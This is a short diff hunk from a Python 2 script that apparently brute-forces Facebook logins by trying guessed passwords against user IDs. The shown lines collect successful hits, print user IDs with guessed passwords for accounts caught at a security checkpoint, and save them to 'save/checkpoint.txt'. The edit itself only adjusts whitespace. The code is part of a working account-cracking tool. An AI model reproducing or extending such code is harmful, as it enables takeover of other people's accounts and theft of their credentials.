@@ -4955,7 +4955,7 @@ def action():
  				                                               oks.append(c+user+pass6)
  				                                           else:
  				            				       if 'www.facebook.com' in q['error_msg']:
- 					                                       print '\033[1;96m[CP] ' + k + c + user + '  》  ' + pass6+'\n'
+ 					                                       print '\033[1;96m[CP] ' + k + c + user + '  》  ' + pass6 +'\n'
  					                                       cps = open('save/checkpoint.txt', 'a')
  					                                       cps.write(k+c+user+'-•◈•-'+pass6+'\n')
  					                                       cps.close()
